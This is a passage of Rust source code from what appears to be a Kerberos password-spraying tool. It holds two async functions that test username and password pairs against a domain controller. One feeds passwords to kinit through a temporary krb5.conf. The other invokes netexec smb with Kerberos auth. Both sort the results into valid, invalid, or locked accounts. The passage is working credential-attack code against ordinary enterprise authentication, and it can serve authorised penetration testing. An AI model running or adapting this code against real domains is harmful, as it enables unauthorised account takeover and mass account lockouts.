    ) -> (bool, Option<String>) {
        use std::process::Stdio;

        // kinit user@REALM with password via stdin
        let principal = format!("{}@{}", username, realm.to_uppercase());

        // Create a temporary krb5.conf pointing to the KDC
        let krb5_conf = format!(
            "[libdefaults]\n  default_realm = {}\n[realms]\n  {} = {{\n    kdc = {}\n  }}\n",
            realm.to_uppercase(),
            realm.to_uppercase(),
            kdc
        );

        // Write temp config
        let temp_conf = "/tmp/krb5_spray_test.conf";
        if let Err(e) = tokio::fs::write(temp_conf, &krb5_conf).await {
            return (false, Some(format!("Failed to write temp config: {}", e)));
        }

        // Spawn the kinit process
        let spawn_result = Command::new("kinit")
            .env("KRB5_CONFIG", temp_conf)
            .arg(&principal)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn();

        match spawn_result {
            Ok(mut child) => {
                // Write password to stdin
                if let Some(mut stdin) = child.stdin.take() {
                    use tokio::io::AsyncWriteExt;
                    let _ = stdin.write_all(format!("{}\n", password).as_bytes()).await;
                    drop(stdin);
                }

                // Wait for output with timeout
                let output = tokio::time::timeout(
                    Duration::from_secs(30),
                    child.wait_with_output()
                ).await;

                let _ = tokio::fs::remove_file(temp_conf).await;

                match output {
                    Ok(Ok(output)) => {
                        let stderr = String::from_utf8_lossy(&output.stderr).to_lowercase();

                        if output.status.success() {
                            info!("Kerberos auth successful (kinit): {}@{}", username, realm);
                            // Clean up the ticket
                            let _ = Command::new("kdestroy").output().await;
                            (true, None)
                        } else if stderr.contains("preauth") || stderr.contains("incorrect") ||
                                  stderr.contains("unknown") {
                            (false, Some("Invalid credentials".to_string()))
                        } else if stderr.contains("locked") || stderr.contains("disabled") {
                            (false, Some("Account locked or disabled".to_string()))
                        } else {
                            (false, Some("Authentication failed".to_string()))
                        }
                    }
                    Ok(Err(e)) => (false, Some(format!("Process error: {}", e))),
                    Err(_) => (false, Some("Connection timeout".to_string())),
                }
            }
            Err(e) => {
                let _ = tokio::fs::remove_file(temp_conf).await;
                (false, Some(format!("Execution error: {}", e)))
            }
        }
    }

    #[allow(dead_code)]
    async fn try_netexec_kerberos(
        kdc: &str,
        realm: &str,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        // netexec smb kdc -u user -p pass -d domain -k
        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("netexec")
                .args([
                    "smb",
                    kdc,
                    "-u",
                    username,
                    "-p",
                    password,
                    "-d",
                    realm,
                    "-k", // Use Kerberos auth
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr);

                if combined.contains("[+]") {
                    info!("Kerberos auth successful (netexec): {}@{}", username, realm);
                    (true, None)
                } else if combined.contains("[-]") || combined.contains("KDC_ERR") {
                    (false, Some("Invalid credentials".to_string()))
                } else {
                    (false, Some("Authentication failed".to_string()))
                }
            }
            Ok(Err(e)) => (false, Some(format!("Execution error: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }
}
